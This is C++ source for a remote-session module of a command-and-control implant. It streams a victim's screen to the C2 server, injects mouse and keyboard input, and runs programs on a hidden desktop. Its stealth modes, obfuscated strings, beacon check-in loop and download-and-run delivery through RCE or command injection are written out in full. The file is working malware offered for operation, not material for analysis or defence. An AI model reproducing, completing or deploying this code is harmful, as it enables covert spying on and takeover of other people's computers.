// ============================================================================
//  Phantom Remote Session Module — main.cpp
//  ────────────────────────────────────────────────────────────────────────────
//  A standalone companion to the beacon. Registers as its OWN beacon identity
//  (R-… prefix) on the same C2, streams the victim's screen as JPEG frames
//  over the same HTTPS channel, and injects mouse/keyboard input with three
//  configurable stealth modes:
//
//    remote mode interactive   — active desktop (cursor visible, VNC-style)
//    remote mode ghost         — hidden virtual desktop (cursor invisible)
//    remote mode steal         — attach to interactive input desktop
//
//  Built separately (phantom --remote-deploy or `use payload` → `remote`)
//  but ALSO droppable standalone via RCE/cmdi. The beacon's `remote` command
//  downloads this binary from the C2 and runs it.
//
//  Commands (queued from the C2 shell like any beacon task):
//    remote start [quality]         start streaming (beacon channel, cadence)
//    remote stop                    stop streaming
//    remote frame [quality]         send a single frame now
//    remote mode <interactive|ghost|steal>
//    remote launch <command>        run an app (on hidden desktop in ghost)
//    remote live [interval_ms]      fast cadence (default 250ms) until stop
//    exit                           terminate the module
//
//  Input injection is an INTERNAL PRIMITIVE (remote_session::inject_input),
//  deliberately not an operator command: the operator interacts with the
//  streamed view in the UI (Electron canvas / C2 shell live view), which
//  forwards translated mouse/keyboard events through this primitive.
// ============================================================================

#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <sstream>
#include <thread>
#include <chrono>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#endif

#include "remote_net.h"
#include "remote_session.h"
#include "c2_config.h"

// Marker prefix for streamed frames — XOR-obfuscated so the plaintext
// "REMOTE_FRAME_B64:" string never appears in the binary.
static std::string _frame_marker() { return R_S("REMOTE_FRAME_B64:"); }

// Default streaming cadence on the beacon channel (ms).
static int g_stream_interval_ms = 3000;
static bool g_streaming = false;
static int g_quality = 55;
static unsigned long g_frame_seq = 0;

static std::string _now_str() {
    char buf[32];
    time_t t = time(nullptr);
    struct tm tmv{};
#ifdef _WIN32
    localtime_s(&tmv, &t);
#else
    localtime_r(&t, &tmv);
#endif
    strftime(buf, sizeof(buf), "%H:%M:%S", &tmv);
    return buf;
}

static std::string _handle_command(const std::string& command,
                                   remote_net::RemoteConfig& cfg) {
    std::istringstream iss(command);
    std::string action;
    iss >> action;
    if (action == "persist") {
        // The C2 auto-queues `persist` for every new beacon. The remote
        // module is a companion agent — persistence is the beacon's job.
        return "not-applicable (persistence is the beacon's role)";
    }
    if (action == "remote") {
        std::string sub;
        iss >> sub;
        if (sub == "start" || sub == "live") {
            int interval = 0;
            iss >> interval;
            if (sub == "live") g_stream_interval_ms = (interval > 0 ? interval : 250);
            else g_stream_interval_ms = (interval > 0 ? interval : 3000);
            g_streaming = true;
            return "streaming started (every " + std::to_string(g_stream_interval_ms) +
                   "ms, beacon channel, mode=" + remote_session::mode_name() + ")";
        }
        if (sub == "stop") {
            g_streaming = false;
            return "streaming stopped";
        }
        if (sub == "frame") {
            int q = 0;
            iss >> q;
            if (q > 0) g_quality = q;
            std::vector<unsigned char> frame;
            if (!remote_session::capture_frame(frame, g_quality)) {
                return "ERROR: capture failed";
            }
            std::string task_id = "frame-" + std::to_string(time(nullptr)) + "-" +
                                  std::to_string(++g_frame_seq);
            std::string b64 = remote_net::_b64(frame);
            if (!remote_net::send_result(cfg, task_id, _frame_marker() + b64)) {
                return "ERROR: frame send failed";
            }
            return "frame sent (" + std::to_string(frame.size()) + " bytes, q" +
                   std::to_string(g_quality) + ")";
        }
        if (sub == "input") {
            // internal primitive (UI forwards translated events here)
            std::string args;
            std::getline(iss >> std::ws, args);
            return remote_session::inject_input(args);
        }
        if (sub == "mode") {
            std::string mode;
            iss >> mode;
            return remote_session::set_mode(mode);
        }
        if (sub == "launch") {
            std::string cmd;
            std::getline(iss >> std::ws, cmd);
            return remote_session::launch(cmd);
        }
        return "Usage: remote <start [ms]|live [ms]|stop|frame [q]|"
               "mode <interactive|ghost|steal>|launch <cmd>>";
    }
    if (action == "exit" || action == "kill") {
        return "\x01\x02EX";
    }
    return "unknown remote command: " + action;
}

// One streaming frame sent on the beacon channel (respects cadence).
static void _maybe_stream_frame(remote_net::RemoteConfig& cfg) {
    if (!g_streaming) return;
    static auto last = std::chrono::steady_clock::now();
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - last).count();
    if (elapsed < g_stream_interval_ms) return;
    last = now;
    std::vector<unsigned char> frame;
    if (!remote_session::capture_frame(frame, g_quality)) return;
    std::string task_id = "frame-" + std::to_string(time(nullptr)) + "-" +
                          std::to_string(++g_frame_seq);
    remote_net::send_result(cfg, task_id, _frame_marker() + remote_net::_b64(frame));
}

static int remote_main(int argc, char** argv) {
    remote_net::RemoteConfig cfg;
#if BEACON_AUTH_ENABLED
    cfg.beacon_id = BEACON_AUTH_ID;
#else
    cfg.beacon_id = "R-" + crypto::random_hex(8);
#endif
#ifdef _WIN32
    cfg.host = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
#else
    cfg.host = C2_HOST;
#endif
    cfg.port = C2_PORT;
    cfg.use_https = C2_USE_HTTPS != 0;

    // argv overrides (host port use_https) — same convention as the beacon,
    // so the dropper can point a compiled binary at a different listener.
    if (argc >= 2) {
        std::string host_str(argv[1]);
#ifdef _WIN32
        cfg.host = std::wstring(host_str.begin(), host_str.end());
#else
        cfg.host = host_str;
#endif
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
        if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
    }

    bool alive = true;
    int consecutive_failures = 0;
    std::vector<std::pair<std::string, std::string>> pending_results;

    while (alive) {
        // Minimal telemetry so the C2 shows the remote session with identity.
        std::string telemetry = "{\"sysinfo\":\"Remote Session Module\\nOS: " +
                                remote_session::mode_name() + "\"}";
        std::string response = remote_net::checkin(cfg, telemetry);

        if (!response.empty()) {
            consecutive_failures = 0;
            // Retry undelivered results first.
            for (auto it = pending_results.begin(); it != pending_results.end();) {
                if (remote_net::send_result(cfg, it->first, it->second)) {
                    it = pending_results.erase(it);
                } else break;
            }
            auto tasks = remote_net::parse_tasks(response);
            for (auto& task : tasks) {
                std::string output = _handle_command(task.command, cfg);
                if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                    alive = false;
                    break;
                }
                if (!remote_net::send_result(cfg, task.task_id, output)) {
                    pending_results.emplace_back(task.task_id, output);
                }
            }
            // Streaming frame on the same channel when active.
            _maybe_stream_frame(cfg);
        } else {
            consecutive_failures++;
            if (consecutive_failures > 1 && cfg.port != 0) {
                // exponential backoff capped at 60s
                int sleep_ms = std::min(60000, 5000 * consecutive_failures);
                std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
                continue;
            }
        }
        // Cadence: streaming keeps the module awake at the stream interval;
        // otherwise the configured check-in sleep.
        int sleep_ms = g_streaming ? g_stream_interval_ms : 5000;
        std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
    }
    return 0;
}

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    int argc = 0;
    char** argv = nullptr;
    std::vector<std::string> args;
    args.push_back("remote.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }
    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);
    return remote_main((int)argv_ptrs.size(), argv_ptrs.data());
}
#else
int main(int argc, char** argv) {
    return remote_main(argc, argv);
}
#endif